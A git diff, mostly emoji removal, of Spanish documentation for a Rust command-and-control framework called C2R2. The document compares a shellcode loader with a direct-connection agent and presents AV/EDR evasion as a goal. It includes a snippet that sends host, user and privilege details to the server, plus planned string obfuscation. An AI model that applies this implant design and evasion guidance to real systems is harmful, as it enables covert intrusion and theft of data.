@@ -1,12 +1,12 @@
 # C2R2 v2.0 - Conexión Directa sin Shellcode
 
-## 📋 Resumen de Cambios
+##  Resumen de Cambios
 
 Este documento explica la diferencia entre el enfoque anterior (v1.0 con shellcode) y el nuevo enfoque (v2.0 con conexión directa), inspirado en [Nightmangle](https://github.com/1N73LL1G3NC3x/Nightmangle).
 
 ---
 
-## 🔄 Comparación: v1.0 vs v2.0
+##  Comparación: v1.0 vs v2.0
 
 ### **Versión 1.0 (Con Shellcode - Branch anterior)**
 
@@ -111,23 +111,23 @@ Este documento explica la diferencia entre el enfoque anterior (v1.0 con shellco
 
 ---
 
-## ✅ Ventajas de la Conexión Directa (v2.0)
+##  Ventajas de la Conexión Directa (v2.0)
 
 ### 1. **Independencia Total**
-- ❌ **Antes**: Dependías de `msfvenom` → necesitas Metasploit instalado
-- ✅ **Ahora**: Todo en Rust → solo necesitas `rustc` y `mingw-w64`
+-  **Antes**: Dependías de `msfvenom` → necesitas Metasploit instalado
+-  **Ahora**: Todo en Rust → solo necesitas `rustc` y `mingw-w64`
 
 ### 2. **Menos Detectable**
-- ❌ **Antes**: Shellcode de Metasploit es conocido por AV/EDR
-- ✅ **Ahora**: Código Rust compilado nativo → menos firmas conocidas
+-  **Antes**: Shellcode de Metasploit es conocido por AV/EDR
+-  **Ahora**: Código Rust compilado nativo → menos firmas conocidas
 
 ### 3. **Menos Complejo**
-- ❌ **Antes**: Encriptación → Desencriptación → VirtualAlloc → CreateThread
-- ✅ **Ahora**: TcpStream directo → Command::output()
+-  **Antes**: Encriptación → Desencriptación → VirtualAlloc → CreateThread
+-  **Ahora**: TcpStream directo → Command::output()
 
 ### 4. **Más Mantenible**
-- ❌ **Antes**: Si cambias protocolo, debes regenerar shellcode
-- ✅ **Ahora**: Editas el código Rust y recompilas
+-  **Antes**: Si cambias protocolo, debes regenerar shellcode
+-  **Ahora**: Editas el código Rust y recompilas
 
 ### 5. **Tamaño del Binario**
 ```
@@ -143,12 +143,12 @@ v2.0 (conexión directa):
 ```
 
 ### 6. **Control Total del Protocolo**
-- ❌ **Antes**: Limitado al protocolo de meterpreter
-- ✅ **Ahora**: Defines tu propio protocolo C2
+-  **Antes**: Limitado al protocolo de meterpreter
+-  **Ahora**: Defines tu propio protocolo C2
 
 ---
 
-## 🔧 Cómo Usar v2.0
+##  Cómo Usar v2.0
 
 ### Desde Kali Linux (Atacante):
 
@@ -199,7 +199,7 @@ cargo build --release --manifest-path c2r2-server/Cargo.toml
 
 ---
 
-## 📊 Análisis Técnico
+##  Análisis Técnico
 
 ### Comparación de Memoria en Ejecución
 
@@ -213,11 +213,11 @@ cargo build --release --manifest-path c2r2-server/Cargo.toml
 │ .data   → KEY, IV                   │
 │ Stack   → Variables locales         │
 │ Heap    → Buffer desencriptado      │
-│ VAlloc  → Shellcode ejecutable ⚠️   │ ← Muy sospechoso
+│ VAlloc  → Shellcode ejecutable    │ ← Muy sospechoso
 │         → (PAGE_EXECUTE_READWRITE)  │
 └─────────────────────────────────────┘
 ```
-**🚨 Problemas**:
+** Problemas**:
 - Memory region con RWX (Read-Write-Execute)
 - Shellcode pattern matching
 - Injection detectado por EDR
@@ -234,14 +234,14 @@ cargo build --release --manifest-path c2r2-server/Cargo.toml
 │         → (Normal memory)           │
 └─────────────────────────────────────┘
 ```
-**✅ Beneficios**:
+** Beneficios**:
 - No hay regiones RWX
 - Todo es código legítimo compilado
 - Parece software normal
 
 ---
 
-## 🎯 Protocolo C2 v2.0
+##  Protocolo C2 v2.0
 
 ### Comunicación Agent → Server
 
@@ -279,7 +279,7 @@ Agent → Server: Volume in drive C...
 
 ---
 
-## 🔒 Evasión y Seguridad
+##  Evasión y Seguridad
 
 ### Técnicas Implementadas en v2.0
 
@@ -303,7 +303,7 @@ fn send_sysinfo(writer: &mut TcpStream) {
     let username = get_system_info("username");
     let os = get_system_info("os");
     let privileges = get_system_info("privileges");
-    
+
     // Enviar todo en un solo mensaje
     let sysinfo = format!("__SYSINFO__:hostname:{}\n...", hostname);
     writer.write_all(sysinfo.as_bytes()).ok();
@@ -324,7 +324,7 @@ fn send_sysinfo(writer: &mut TcpStream) {
 
 ---
 
-## 🚀 Próximas Mejoras
+##  Próximas Mejoras
 
 ### Para v2.1:
 - [ ] **Ofuscación de strings**: Encriptar "C2_SERVER" en compilación
@@ -342,31 +342,31 @@ fn send_sysinfo(writer: &mut TcpStream) {
 
 ---
 
-## 📈 Comparación de Detección
+##  Comparación de Detección
 
 | Indicador                  | v1.0 (Shellcode) | v2.0 (Directo) |
 |----------------------------|------------------|----------------|
-| Firmas de Shellcode        | 🔴 Alto          | 🟢 Ninguno     |
-| Memory RWX                 | 🔴 Presente      | 🟢 Ausente     |
-| Injection de código        | 🔴 Sí            | 🟢 No          |
-| Dependencia de Metasploit  | 🔴 Sí            | 🟢 No          |
-| Tamaño del binario         | 🟡 150-200KB     | 🟢 50-80KB     |
-| Complejidad del código     | 🟡 Media         | 🟢 Baja        |
-| Mantenibilidad             | 🟡 Media         | 🟢 Alta        |
-| Customización del C2       | 🔴 Limitada      | 🟢 Total       |
+| Firmas de Shellcode        |  Alto          |  Ninguno     |
+| Memory RWX                 |  Presente      |  Ausente     |
+| Injection de código        |  Sí            |  No          |
+| Dependencia de Metasploit  |  Sí            |  No          |
+| Tamaño del binario         |  150-200KB     |  50-80KB     |
+| Complejidad del código     |  Media         |  Baja        |
+| Mantenibilidad             |  Media         |  Alta        |
+| Customización del C2       |  Limitada      |  Total       |
 
 ---
 
-## 🎓 Conclusión
+##  Conclusión
 
 La versión 2.0 con **conexión directa** sigue el ejemplo de proyectos modernos como **Nightmangle** que usan Telegram como C2. En nuestro caso, usamos un servidor Tokio custom.
 
 ### Ventajas Clave:
-1. ✅ **Independiente** - No necesita Metasploit
-2. ✅ **Más limpio** - Sin shellcode en memoria
-3. ✅ **Más pequeño** - Menos dependencias
-4. ✅ **Más flexible** - Control total del protocolo
-5. ✅ **Menos detectable** - Sin patrones conocidos
+1.  **Independiente** - No necesita Metasploit
+2.  **Más limpio** - Sin shellcode en memoria
+3.  **Más pequeño** - Menos dependencias
+4.  **Más flexible** - Control total del protocolo
+5.  **Menos detectable** - Sin patrones conocidos
 
 ### Cuándo Usar Cada Versión:
 
@@ -383,7 +383,7 @@ La versión 2.0 con **conexión directa** sigue el ejemplo de proyectos modernos
 
 ---
 
-## 📚 Referencias
+##  Referencias
 
 - [Nightmangle](https://github.com/1N73LL1G3NC3x/Nightmangle) - C2 con Telegram
 - [Sliver](https://github.com/BishopFox/sliver) - C2 moderno en Go
@@ -392,7 +392,7 @@ La versión 2.0 con **conexión directa** sigue el ejemplo de proyectos modernos
 
 ---
 
-**Autor**: C2R2 Team  
-**Versión**: 2.0  
-**Fecha**: 15 de Octubre, 2025  
+**Autor**: C2R2 Team
+**Versión**: 2.0
+**Fecha**: 15 de Octubre, 2025
 **Licencia**: Educational Purposes Only
